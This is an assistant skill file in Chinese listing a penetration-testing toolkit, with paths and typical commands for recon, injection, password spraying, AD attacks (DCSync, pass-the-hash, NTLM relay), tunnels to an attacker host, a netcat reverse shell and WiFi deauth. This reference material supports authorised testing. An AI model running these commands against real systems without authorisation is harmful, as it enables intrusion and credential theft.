---
name: sectoolkit
description: 安全工具集完整参考手册，列出所有已安装工具的分类、路径、常用命令及使用说明
user_invocable: true
---

当用户调用此 skill 时，你拥有以下完整的安全工具集知识库，可以告诉用户有哪些工具、各属于什么分类、怎么使用。

---

# 安全工具集完整参考手册

> 工具安装于 Ubuntu 24.04，工具根目录 `/opt/tools/`，字典目录 `/opt/wordlists/`
> Go 工具位于 ，系统命令在 PATH 中直接可用

---

## 一、信息收集 / 侦察

### 1.1 子域名枚举

| 工具 | 路径/命令 | 典型用法 |
|------|-----------|----------|
| **subfinder** | `subfinder` | `subfinder -d target.com -o subs.txt` |
| **amass** | amass | `amass enum -d target.com -o subs.txt` |
| **assetfinder** | assetfinder | `assetfinder --subs-only target.com` |
| **dnsx** | `dnsx` | `cat subs.txt \| dnsx -resp -a` |
| **shuffledns** | shuffledns | `shuffledns -d target.com -w /opt/wordlists/subdomains-top5000.txt -r resolvers.txt` |

### 1.2 端口扫描

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **nmap** | `nmap` | `nmap -sV -sC -p- --open -T4 target` |
| **masscan** | `masscan` | `masscan -p1-65535 target --rate=10000` |
| **naabu** | `naabu` | `naabu -host target.com -p - -o ports.txt` |
| **fscan** | fscan | `fscan -h 192.168.1.0/24` (内网快速扫描) |

### 1.3 HTTP 探测 / 指纹识别

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **httpx** | `httpx` | `cat hosts.txt \| httpx -title -tech-detect -status-code` |
| **whatweb** | `whatweb` | `whatweb -a 3 https://target.com` |
| **wafw00f** | `wafw00f` (pip安装) | `wafw00f https://target.com` |
| **httprobe** | httprobe | `cat subs.txt \| httprobe` |

### 1.4 OSINT / 信息搜集

| 工具 | 路径 | 典型用法 |
|------|------|----------|
| **theHarvester** | `/opt/tools/theharvester/theHarvester.py` | `python3 theHarvester.py -d target.com -b google,linkedin` |
| **sherlock** | `/opt/tools/sherlock/sherlock.py` | `python3 sherlock.py username` (社交账号追踪) |
| **recon-ng** | `/opt/tools/recon-ng/recon-ng` | `./recon-ng` (交互式OSINT框架) |
| **spiderfoot** | `/opt/tools/spiderfoot/sf.py` | `python3 sf.py -l 127.0.0.1:5001` (Web UI) |
| **metabigor** | metabigor | `echo "target.com" \| metabigor net --org` |

### 1.5 URL / 历史记录

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **waybackurls** | waybackurls | `echo target.com \| waybackurls` |
| **gau** | gau | `gau target.com` |
| **katana** | `katana` | `katana -u https://target.com -d 5` |
| **hakrawler** | hakrawler | `echo https://target.com \| hakrawler` |
| **gospider** | gospider | `gospider -s https://target.com -d 3` |

---

## 二、漏洞扫描

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **nuclei** | `nuclei` | `nuclei -u https://target.com -t /opt/wordlists/nuclei-templates/` |
| **nikto** | `nikto` | `nikto -h https://target.com` |
| **nmap NSE** | `nmap` | `nmap --script vuln target` |
| **searchsploit** | `searchsploit` | `searchsploit apache 2.4` (查exploit-db) |
| **AutoRecon** | `/opt/tools/autorecon/autorecon.py` | `python3 autorecon.py target` (全自动扫描) |

---

## 三、Web 应用渗透

### 3.1 目录枚举

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **gobuster** | `gobuster` | `gobuster dir -u https://target.com -w /opt/wordlists/seclists/Discovery/Web-Content/common.txt` |
| **ffuf** | `ffuf` | `ffuf -u https://target.com/FUZZ -w /opt/wordlists/seclists/Discovery/Web-Content/big.txt` |
| **feroxbuster** | `feroxbuster` | `feroxbuster -u https://target.com -w wordlist.txt` |
| **dirb** | `dirb` | `dirb https://target.com /opt/wordlists/seclists/Discovery/Web-Content/common.txt` |
| **dirsearch** | `/opt/tools/dirsearch/dirsearch.py` | `python3 dirsearch.py -u https://target.com` |
| **wfuzz** | `wfuzz` | `wfuzz -c -w wordlist.txt https://target.com/FUZZ` |

### 3.2 注入攻击

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **sqlmap** | `sqlmap` | `sqlmap -u "https://target.com?id=1" --dbs --batch` |
| **commix** | `/opt/tools/commix/commix.py` | `python3 commix.py --url="https://target.com?cmd=id"` (命令注入) |
| **XSStrike** | `/opt/tools/xsstrike/xsstrike.py` | `python3 xsstrike.py -u https://target.com?q=test` |
| **dalfox** | dalfox | `dalfox url https://target.com?q=test` (XSS扫描) |
| **patator** | `/opt/tools/patator/patator.py` | `python3 patator.py http_fuzz url=https://target.com/FUZZ` |

### 3.3 CMS 专项

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **wpscan** | `wpscan` | `wpscan --url https://target.com --enumerate p,u` (WordPress) |
| **joomscan** | `/opt/tools/joomscan/joomscan.pl` | `perl joomscan.pl -u https://target.com` (Joomla) |
| **droopescan** | `droopescan` | `droopescan scan drupal -u https://target.com` (Drupal) |

### 3.4 SSL/TLS

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **sslscan** | `sslscan` | `sslscan target.com` |
| **sslyze** | `sslyze` (pip) | `sslyze target.com` |
| **testssl.sh** | (可手动下载) | `./testssl.sh https://target.com` |

---

## 四、密码攻击

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **hydra** | `hydra` | `hydra -L users.txt -P /opt/wordlists/rockyou.txt ssh://target` |
| **medusa** | `medusa` | `medusa -H hosts.txt -U users.txt -P pass.txt -M ssh` |
| **john** | `john` | `john --wordlist=/opt/wordlists/rockyou.txt hash.txt` |
| **hashcat** | `hashcat` | `hashcat -m 1000 hash.txt /opt/wordlists/rockyou.txt` (NTLM) |
| **cewl** | `cewl` | `cewl https://target.com -d 3 -m 6 -w wordlist.txt` (生成字典) |
| **patator** | `/opt/tools/patator/patator.py` | `python3 patator.py ftp_login host=target user=FILE0 password=FILE1` |

### 字典资源

| 字典 | 路径 | 说明 |
|------|------|------|
| **rockyou.txt** | `/opt/wordlists/rockyou.txt` | 经典密码字典 1400万条 |
| **SecLists** | `/opt/wordlists/seclists/` | 最全安全测试字典集 |
| **fuzzDicts** | `/opt/wordlists/fuzzDicts/` | 中文fuzz字典 |
| **PayloadsAllTheThings** | `/opt/wordlists/payloads-all-things/` | 各类漏洞payload |
| **passworddic-cn** | `/opt/wordlists/passworddic-cn/` | 中文/中国常用密码 |

---

## 五、利用框架

| 工具 | 路径 | 典型用法 |
|------|------|----------|
| **Metasploit** | `/opt/tools/metasploit/msfconsole` | `./msfconsole` (需先 `cd /opt/tools/metasploit && bundle install`) |
| **searchsploit** | `searchsploit` | `searchsploit -x windows/remote/12345.rb` (查看exploit) |
| **routersploit** | `/opt/tools/routersploit/rsf.py` | `python3 rsf.py` (路由器漏洞利用框架) |
| **exploitdb** | `/opt/exploitdb/` | searchsploit后`-m`下载exploit到本地 |

---

## 六、内网横移 / AD 攻击

### 6.1 核心工具

| 工具 | 路径/命令 | 典型用法 |
|------|-----------|----------|
| **impacket 套件** | `pip安装，直接调用` | 见下方各脚本 |
| **crackmapexec(源码)** | `/opt/tools/crackmapexec/` | AD横移框架，需`pip install .` |
| **evil-winrm** | `/opt/tools/evil-winrm/evil-winrm.rb` | `ruby evil-winrm.rb -i target -u admin -p pass` |
| **BloodHound.py** | `bloodhound-python` (pip安装) | `bloodhound-python -u user -p pass -d domain.local -ns dc-ip -c all` |
| **ldapdomaindump** | `ldapdomaindump` (pip安装) | `ldapdomaindump -u 'domain\user' -p pass dc-ip` |

### 6.2 Impacket 工具集

```bash
# PTH (Pass-The-Hash)
python3 /usr/local/lib/python3.12/dist-packages/impacket/examples/psexec.py domain/user@target -hashes :NTLMhash

# Kerberoasting
python3 -m impacket.examples.GetUserSPNs domain/user:pass -dc-ip dc-ip -request

# AS-REP Roasting  
python3 -m impacket.examples.GetNPUsers domain/ -usersfile users.txt -dc-ip dc-ip

# DCSync
python3 -m impacket.examples.secretsdump domain/user:pass@dc-ip

# SMB枚举
python3 -m impacket.examples.smbclient //target/share -U user

# WMIexec
python3 -m impacket.examples.wmiexec domain/user:pass@target

# Ticket操作
python3 -m impacket.examples.ticketer -nthash hash -domain-sid S-1-5-21-xxx -domain domain.local username
```

### 6.3 AD 漏洞利用

| 工具 | 路径 | 漏洞 |
|------|------|------|
| **noPac** | `/opt/tools/nopac/` | CVE-2021-42278/42287 |
| **Certipy** | `certipy-ad` (pip安装) | AD CS证书服务攻击 |
| **Coercer** | `/opt/tools/coercer/` | NTLM强制认证 |
| **mitm6** | `mitm6` (pip安装) | IPv6 MITM + NTLM中继 |

```bash
# Certipy - ESC1攻击
certipy-ad find -u user@domain.local -p pass -dc-ip dc-ip
certipy-ad req -u user@domain.local -p pass -ca 'CA-Name' -template 'VulnTemplate'

# mitm6 + ntlmrelayx
mitm6 -d domain.local &
python3 -m impacket.examples.ntlmrelayx -6 -t ldaps://dc-ip --delegate-access

# noPac
python3 scanner.py domain.local/user:pass -dc-ip dc-ip -use-ldap
python3 noPac.py domain.local/user:pass -dc-ip dc-ip --impersonate administrator -shell
```

### 6.4 横向移动

```bash
# fscan 内网快扫
fscan -h 192.168.1.0/24 -o result.txt

# CrackMapExec (需安装)
cme smb 192.168.1.0/24 -u user -p pass
cme smb targets.txt -u admin -H NTLMhash --exec-method smbexec -x "whoami"

# Evil-WinRM
ruby /opt/tools/evil-winrm/evil-winrm.rb -i target -u admin -p password
ruby /opt/tools/evil-winrm/evil-winrm.rb -i target -u admin -H NTLMhash
```

---

## 七、隧道 / 代理 / 流量转发

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **chisel** | `chisel` | `chisel server -p 8080 --reverse` / `chisel client attacker:8080 R:socks` |
| **ligolo-ng** | `ligolo-proxy` / `ligolo-agent` | 全能内网隧道 |
| **socat** | `socat` | `socat TCP-LISTEN:8080,fork TCP:target:80` |
| **proxychains4** | `proxychains4` | `proxychains4 nmap -sT target` |
| **netcat** | `nc` | `nc -lvnp 4444` / `nc target 4444 -e /bin/bash` |

```bash
# ligolo-ng 完整流程
# 攻击机(代理端)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# 目标机(代理agent)
./ligolo-agent -connect attacker:11601 -ignore-cert
# 代理端控制台添加路由
>> session
>> start
# 添加内网路由
ip route add 10.0.0.0/24 dev ligolo

# chisel SOCKS5代理
# 攻击机
chisel server -p 1080 --reverse --socks5
# 目标机
chisel client attacker:1080 R:socks
# 使用
proxychains4 -q nmap -sT -p 80,443 10.0.0.1
```

---

## 八、中间人攻击 / 网络嗅探

| 工具 | 命令/路径 | 典型用法 |
|------|-----------|----------|
| **Responder** | `/opt/tools/responder/Responder.py` | `python3 Responder.py -I eth0 -wdv` |
| **tcpdump** | `tcpdump` | `tcpdump -i eth0 -w capture.pcap` |
| **arp-scan** | `arp-scan` | `arp-scan -l` (扫描本地网段) |
| **nbtscan** | `nbtscan` | `nbtscan 192.168.1.0/24` |
| **mitm6** | `mitm6` | `mitm6 -d domain.local` |

---

## 九、提权

### 9.1 Linux 提权

| 工具 | 路径 | 用途 |
|------|------|------|
| **linPEAS** | `/opt/tools/peass/linPEAS/linpeas.sh` | 全自动Linux提权枚举 |
| **LinEnum** | `/opt/tools/linenum/LinEnum.sh` | Linux枚举脚本 |
| **linux-exploit-suggester** | `/opt/tools/linux-exploit-suggester/linux-exploit-suggester.sh` | 内核漏洞建议 |
| **linuxprivchecker** | `/opt/tools/linuxprivchecker/linuxprivchecker.py` | 提权检查 |
| **pwntools** | `python3 -c "from pwn import *"` | CTF/漏洞利用开发 |
| **gdb + peda/pwndbg** | `gdb` | 调试/二进制利用 |

```bash
# linPEAS
bash /opt/tools/peass/linPEAS/linpeas.sh | tee /tmp/linpeas.txt

# linux-exploit-suggester
bash /opt/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

### 9.2 Windows 提权/后渗透

| 工具 | 路径 | 说明 |
|------|------|------|
| **WinPEAS** | `/opt/tools/peass/winPEAS/` | Windows提权枚举 |
| **PowerSploit** | `/opt/tools/powersploit/` | PowerShell后渗透框架 |
| **Nishang** | `/opt/tools/nishang/` | PowerShell攻击脚本集 |
| **PowerUpSQL** | `/opt/tools/powerupsql/` | MSSQL提权 |
| **SharpCollection** | `/opt/tools/sharpcollection/` | C# .NET预编译工具集 |
| **LaZagne** | `/opt/tools/lazagne/` | 凭据提取工具 |
| **Invoke-Obfuscation** | `/opt/tools/invoke-obfuscation/` | PS混淆绕过 |

---

## 十、无线攻击

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **aircrack-ng** | `aircrack-ng` | `aircrack-ng -w /opt/wordlists/rockyou.txt capture.cap` |
| **airgeddon** | `/opt/tools/airgeddon/airgeddon.sh` | `bash airgeddon.sh` (全自动WiFi攻击框架) |

```bash
# WiFi握手包抓取+破解
airmon-ng start wlan0
airodump-ng wlan0mon --bssid target-bssid -c channel -w capture
aireplay-ng --deauth 10 -a target-bssid wlan0mon  # 强制重认证
aircrack-ng -w /opt/wordlists/rockyou.txt capture-01.cap
```

---

## 十一、云安全

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **pacu** | `pacu` (pip安装) | `pacu` (AWS渗透测试框架) |
| **ScoutSuite** | `scout` (pip安装) | `scout aws` (多云安全审计) |
| **cloudsplaining** | `cloudsplaining` (pip安装) | `cloudsplaining download --profile default` |

---

## 十二、社会工程学

| 工具 | 路径 | 典型用法 |
|------|------|----------|
| **SET (Social Engineering Toolkit)** | `/opt/tools/set/setoolkit` | `python3 setoolkit` |

---

## 十三、逆向工程 / 二进制分析

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **radare2** | `radare2` / `r2` | `r2 -A binary` |
| **gdb** | `gdb` | `gdb ./binary` + `run` + `info functions` |
| **binwalk** | `binwalk` | `binwalk -e firmware.bin` |
| **strings** | `strings` | `strings binary \| grep -i pass` |
| **ltrace/strace** | `ltrace`/`strace` | `strace ./binary` (系统调用追踪) |

---

## 十四、隐写术 / 取证

| 工具 | 命令 | 典型用法 |
|------|------|----------|
| **steghide** | `steghide` | `steghide extract -sf image.jpg` |
| **exiftool** | `exiftool` | `exiftool file.jpg` (查看元数据) |
| **foremost** | `foremost` | `foremost -i disk.img -o output/` |
| **binwalk** | `binwalk` | `binwalk -e file.jpg` |

---

## 十五、模板 / Payload 资源

| 资源 | 路径 | 说明 |
|------|------|------|
| **SecLists** | `/opt/wordlists/seclists/` | Discovery/Passwords/Fuzzing等 |
| **Nuclei Templates** | `/opt/wordlists/nuclei-templates/` | 5000+漏洞扫描模板 |
| **PayloadsAllTheThings** | `/opt/wordlists/payloads-all-things/` | SQLi/XSS/RCE/SSTI等Payload |
| **fuzzDicts** | `/opt/wordlists/fuzzDicts/` | 路径/参数/用户名字典 |
| **rockyou.txt** | `/opt/wordlists/rockyou.txt` | 密码破解字典 |
| **subdomains-top5000** | `/opt/wordlists/subdomains-top5000.txt` | 子域名枚举字典 |
| **中文密码字典** | `/opt/wordlists/passworddic-cn/` | 中国常用弱口令 |
| **Exploit-DB** | `/opt/exploitdb/` | 本地CVE漏洞数据库 |

### SecLists 常用路径速查

```
/opt/wordlists/seclists/Discovery/Web-Content/common.txt          # 目录枚举
/opt/wordlists/seclists/Discovery/Web-Content/big.txt             # 大型目录字典
/opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  # 子域名
/opt/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt
/opt/wordlists/seclists/Usernames/Names/names.txt
/opt/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt
/opt/wordlists/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```

---

## 附：快速命令参考

```bash
# 完整侦察流程
subfinder -d target.com | dnsx -resp-only | httpx -title -tech-detect | tee recon.txt

# 快速漏洞扫描
nuclei -l urls.txt -t /opt/wordlists/nuclei-templates/ -severity medium,high,critical

# 内网快扫
fscan -h 192.168.1.0/24 -o internal.txt

# 密码喷洒
crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success

# 域信息收集  
bloodhound-python -u user -p pass -d corp.local -ns dc-ip -c all --zip

# 快速端口扫描+服务识别
nmap -sV --open -p- -T4 --min-rate 5000 target -oA scan_result
```

---

## 工具路径速查表

| 分类 | 工具 | 路径/命令 |
|------|------|-----------|
| 子域 | subfinder | `subfinder` |
| 子域 | amass | amass |
| 端口 | nmap | `nmap` |
| 端口 | masscan | `masscan` |
| 端口 | naabu | `naabu` |
| HTTP探测 | httpx | `httpx` |
| 目录 | ffuf | `ffuf` |
| 目录 | gobuster | `gobuster` |
| 目录 | feroxbuster | `feroxbuster` |
| 漏扫 | nuclei | `nuclei` |
| 漏扫 | nikto | `nikto` |
| SQL注入 | sqlmap | `sqlmap` |
| XSS | dalfox | dalfox |
| 密码 | hydra | `hydra` |
| 密码 | hashcat | `hashcat` |
| 密码 | john | `john` |
| AD横移 | impacket | `python3 -m impacket.examples.*` |
| AD | bloodhound-python | `bloodhound-python` |
| AD | evil-winrm | `/opt/tools/evil-winrm/evil-winrm.rb` |
| 隧道 | chisel | `chisel` |
| 隧道 | ligolo | `ligolo-proxy` / `ligolo-agent` |
| 后渗透 | linPEAS | `/opt/tools/peass/linPEAS/linpeas.sh` |
| 提权 | linux-exploit-suggester | `/opt/tools/linux-exploit-suggester/linux-exploit-suggester.sh` |
| 框架 | metasploit | `/opt/tools/metasploit/` |
| 框架 | exploitdb | `searchsploit` |
| 无线 | aircrack-ng | `aircrack-ng` |
| 嗅探 | responder | `/opt/tools/responder/Responder.py` |
| 云 | pacu | `pacu` |
| 逆向 | radare2 | `r2` |
| OSINT | sherlock | `/opt/tools/sherlock/sherlock.py` |
| 字典 | SecLists | `/opt/wordlists/seclists/` |
| 字典 | rockyou | `/opt/wordlists/rockyou.txt` |
| Payload | PayloadsAllTheThings | `/opt/wordlists/payloads-all-things/` |
